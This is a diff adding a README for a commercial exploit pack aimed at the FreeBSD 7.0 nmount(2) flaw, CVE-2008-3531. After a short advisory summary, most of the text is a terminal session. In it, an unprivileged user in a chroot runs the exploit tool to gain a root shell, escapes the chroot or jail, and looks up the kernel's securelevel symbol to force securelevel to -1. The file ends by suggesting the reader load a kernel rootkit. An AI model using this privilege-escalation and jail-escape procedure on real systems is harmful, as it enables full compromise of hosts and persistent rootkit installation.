@@ -1,0 +1,111 @@
+D2 Exploitation Pack
+====================
+
+Copyright (c) 2007-2009 DSquare Security, LLC
+
+
+License information
+-------------------
+
+See the file "LICENSE.txt" for information on the history of this
+software, terms & conditions for usage, and a DISCLAIMER OF ALL
+WARRANTIES.
+
+Vulnerability description:
+---------------------------
+
+Topic:          nmount(2) local arbitrary code execution
+Category:       core
+Module:         sys_kern
+Announced:      2008-09-03
+Credits:        James Gritton
+Affects:        FreeBSD 7.0-RELEASE, FreeBSD 7.0-STABLE
+Corrected:      2008-09-03 19:09:47 UTC (RELENG_7, 7.1-PRERELEASE)
+                2008-09-03 19:09:47 UTC (RELENG_7_0, 7.0-RELEASE-p4)
+CVE Name:       CVE-2008-3531
+
+http://security.freebsd.org/advisories/FreeBSD-SA-08:08.nmount.asc
+
+Exploit description:
+--------------------
+
+This exploit contains 3 payloads :
+
+1 - Launch /bin/sh with uid 0
+2 - Chroot breaking and jail escaping
+3 - Set securelevel to -1
+
+You can't exploit this vulnerability if:
+- You are unprivileged user and vfs.usermount = 0
+- Securelevel >= 2
+- You are inside a jail with mount restriction
+
+Exploit:
+--------
+
+[root@freebsd-70-x86 ~/chroot]# uname -srn
+FreeBSD freebsd-70-x86.xxxx.xxx 7.0-RELEASE
+[root@freebsd-70-x86 ~/chroot]# sysctl vfs.usermount=1 
+vfs.usermount: 0 -> 1
+
+User can use mount.
+
+[root@freebsd-70-x86 ~/chroot]# sysctl kern.securelevel=1
+kern.securelevel: -1 -> 1
+[root@freebsd-70-x86 ~/chroot]# chroot -u pouet -g pouet . /bin/sh
+$ ls /
+Makefile	bin		freebsd-mount	freebsd-mount.c	lib		libexec		sbin		tmp	 usr
+$ id
+uid=1001 gid=1001 groups=1001,0,5
+
+We are inside a chroot and our uid is 1001
+
+$ ./d2sec_mount -h
+
+FreeBSD 7.0 - nmount(2) local arbitrary code execution
+
+./freebsd-mount [-r] [-j] [-s <addr>]
+-r : Give uid 0
+-j : chroot breaking and jail escaping
+-s <addr> : securelevel = -1
+
+$ ./d2sec_mount -r
+# id
+uid=0 gid=0 groups=0,5
+
+We got uid 0
+
+# ./d2sec_mount -j
+# ls /
+.cshrc		COPYRIGHT	cdrom		dist		lib		mnt		root		tmp
+.profile	bin				compat				etc				libexec	 proc  sbin  usr
+.snap						boot								dev	       home   media  rescue  sys  var
+
+We are out of chroot.
+
+# cd root/chroot
+# sysctl kern.securelevel
+kern.securelevel: 1
+# nm /boot/kernel/kernel | grep securelevel
+c0afa670 r __set_sysctl_set_sym_sysctl___kern_securelevel
+c0afbbf8 r __set_sysinit_set_sym_securelevel_lock_mtx_sysinit_sys_init
+c0afc41c r __set_sysuninit_set_sym_securelevel_lock_mtx_sysuninit_sys_uninit
+c0a7aed4 r regression_securelevel_nonmonotonic
+c0b79700 D securelevel
+c074cdb0 T securelevel_ge
+c074cd80 T securelevel_gt
+c0b7a86c d securelevel_lock_args
+c0b79edc d securelevel_lock_mtx_sysinit_sys_init
+c0b79ecc d securelevel_lock_mtx_sysuninit_sys_uninit
+c0bd9c74 b securelevel_mtx
+c0b79ea0 d sysctl___kern_securelevel
+
+To use the securelevel payload, we have to find the symbol
+address of 'securelevel'
+
+# ./d2sec_mount -s c0b79700
+# sysctl kern.securelevel
+kern.securelevel: -1
+# 
+
+Now you load your favorite kernel rootkit ;)
